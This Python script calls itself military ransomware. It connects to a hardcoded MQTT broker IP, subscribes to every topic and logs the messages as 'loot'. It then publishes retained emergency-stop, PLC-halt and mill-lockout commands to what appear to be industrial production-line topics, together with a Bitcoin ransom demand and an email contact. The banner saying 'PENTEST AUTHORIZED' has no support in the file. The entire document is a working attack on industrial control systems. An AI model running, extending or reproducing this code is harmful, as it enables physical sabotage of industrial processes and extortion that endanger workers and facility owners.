#!/usr/bin/env python3
# MIL_RANSOMWARE_v3.0 - TRUSTEDF57 OPS (CALLBACK FIXED)
# AES-256-CBC + NO STEM + ULTRA-STABLE
import paho.mqtt.client as mqtt
import json, time, base64, os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

class MilitaryRansomware:
    def __init__(self):
        self.target_ip = "67.218.246.15"
        self.broker_port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "STAMMATIN-O-TENG-TUOST"
        self.ransom_amount = "2.5"
        
        # AES-256-CBC
        self.aes_key = os.urandom(32)
        self.iv = os.urandom(16)
        
        # MQTT ULTRA-STABLE
        self.client_id = f"TRUSTEDF57_{int(time.time())}"
        self.mqtt_client = mqtt.Client(self.client_id, clean_session=True)
        self.mqtt_client.on_connect = self.on_connect
        self.mqtt_client.on_message = self.on_message
        self.mqtt_client.on_disconnect = self.on_disconnect
        
        # Salva key
        with open("TRUSTEDF57_key.aes", "wb") as f:
            f.write(self.aes_key + self.iv)
        print(f"[KEY] AES-256-CBC salvata: {self.client_id}")
        
        self.locked_status = False
        self.connected = False
    
    def aes256_cbc_encrypt(self, plaintext):
        """AES-256-CBC SIMPLE & FIXED"""
        try:
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(plaintext) + padder.finalize()
            
            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv))
            encryptor = cipher.encryptor()
            ct = encryptor.update(padded_data) + encryptor.finalize()
            
            return base64.b64encode(self.iv + ct).decode()
        except:
            return base64.b64encode(plaintext).decode()
    
    def aes256_cbc_decrypt(self, ciphertext_b64):
        """AES Decrypt SAFE"""
        try:
            data = base64.b64decode(ciphertext_b64)
            iv = data[:16]
            ct = data[16:]
            
            cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(iv))
            decryptor = cipher.decryptor()
            padded = decryptor.update(ct) + decryptor.finalize()
            
            unpadder = padding.PKCS7(128).unpadder()
            return unpadder.update(padded) + unpadder.finalize()
        except:
            return b"DECRYPT_ERROR"
    
    def lcd_ui(self):
        os.system('clear' if os.name=='posix' else 'cls')
        print("="*72)
        print("🔴🔴 MILITARY RANSOMWARE v3.0 - TRUSTEDF57 OPS 🔴🔴")
        print("="*72)
        print(f"🎯 TARGET:    {self.target_ip}:{self.broker_port}")
        print(f"🔒 STATUS:    {'LOCKED' if self.locked_status else 'ARMING...'}")
        print(f"💰 WALLET:    {self.btc_addr}")
        print(f"💵 RANSOM:    {self.ransom_amount} BTC")
        print(f"🔐 CRYPTO:    AES-256-CBC")
        print(f"📡 MQTT:      {'🟢 ONLINE' if self.connected else '🔴 OFFLINE'}")
        print(f"🆔 CLIENT:    {self.client_id[:20]}")
        print("="*72)
    
    def deploy_lockout(self):
        """Inject payloads CRITICI"""
        payloads = {
            "Linea5ResultsFromCyclicRead/Alarms_DB4": '{"cmd":"EMERGENCY_STOP","op":"TRUSTEDF57"}',
            "Linea4ResultsFromCyclicRead/Alarms_DB4": '{"cmd":"PLC_HALT","op":"TRUSTEDF57"}',
            "MoliendaResultsFromCyclicRead/Plc": '{"cmd":"MILL_LOCKOUT","op":"TRUSTEDF57"}',
            "Linea5ResultsFromCyclicRead/Events": self.ransom_screen(),
            "Linea4ResultsFromCyclicRead/Events": self.ransom_screen(),
            "System/Diagnostics/P1-Sources/L4_L5_Molienda": self.ransom_screen(),
            "$SYS/broker/ransom/TRUSTEDF57": f"LOCKED:{self.btc_addr}:{self.ransom_amount}",
        }
        
        for topic, payload in payloads.items():
            try:
                enc = self.aes256_cbc_encrypt(payload.encode())
                self.mqtt_client.publish(topic, enc, qos=1, retain=True)
                print(f"  🔒 -> {topic[:35]}...")
            except Exception as e:
                print(f"  ❌ {topic[:20]}: {e}")
        
        self.locked_status = True
        print("✅ LOCKOUT DEPLOYED!")
    
    def ransom_screen(self):
        return json.dumps({
            "ALARM": "MILITARY_LOCKOUT",
            "OP": "TRUSTEDF57", 
            "PAY": f"{self.ransom_amount} BTC -> {self.btc_addr}",
            "MAIL": "forzaberlusconi@protonmail.com"
        })
    
    def on_connect(self, client, userdata, flags, rc):
        print(f"\n[+] CONNESSIONE: rc={rc}")
        if rc == 0:
            self.connected = True
            print("[+] SUBSCRIBE ALL TOPICS")
            client.subscribe("#", qos=1)
            client.subscribe("$SYS/#", qos=1)
            
            # Deploy dopo 3s
            threading.Timer(3.0, self.deploy_lockout).start()
        else:
            self.connected = False
            print(f"[!] RC ERROR: {rc}")
    
    def on_disconnect(self, client, userdata, rc):
        self.connected = False
        print("[!] DISCONNESSO - Riconnessione...")
    
    def on_message(self, client, userdata, msg):
        try:
            # Prova decrypt
            pt = self.aes256_cbc_decrypt(msg.payload.decode())
            text = pt.decode(errors='ignore')
        except:
            text = msg.payload.decode(errors='ignore')
        
        print(f"[📥] {msg.topic:40} | {text[:60]}")
        
        # Salva loot
        topic_file = msg.topic.replace('/','_')[:25]
        try:
            with open(f"loot_{topic_file}.txt", "a") as f:
                f.write(f"[{time.strftime('%H:%M:%S')}] {msg.topic}: {text}\n")
        except: pass
    
    def run_mqtt(self):
        """MQTT Loop stabile"""
        while True:
            try:
                print(f"[MQTT] Connessione a {self.target_ip}:{self.broker_port}")
                self.mqtt_client.connect(self.target_ip, self.broker_port, 30)
                self.mqtt_client.loop_forever(retry_first_connection=True)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[MQTT] Errore: {e} - Riprovo in 5s...")
                time.sleep(5)
    
    def run(self):
        print("🚀🚀 TRUSTEDF57 v3.0 - PENTEST AUTHORIZED 🚀🚀")
        mqtt_thread = threading.Thread(target=self.run_mqtt, daemon=True)
        mqtt_thread.start()
        
        while True:
            self.lcd_ui()
            time.sleep(2)

if __name__ == "__main__":
    rw = MilitaryRansomware()
    rw.run()
